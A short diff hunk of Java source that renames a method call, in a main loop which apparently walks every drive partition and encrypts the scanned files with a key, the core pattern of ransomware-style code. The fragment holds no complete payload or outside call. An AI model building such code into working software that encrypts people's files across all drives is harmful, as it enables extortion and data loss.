@@ -41,7 +41,7 @@ public class Main {
         GetFiles files = new GetFiles(os);
 
         // get partitions
-        File[] partitions = files.getDrivers();
+        File[] partitions = files.getRoots();
         for (File partition : partitions) {
             // Encryption files
             Encryption.encryption(files.scanFiles(partition, To.ENCRYPTION, false), key);
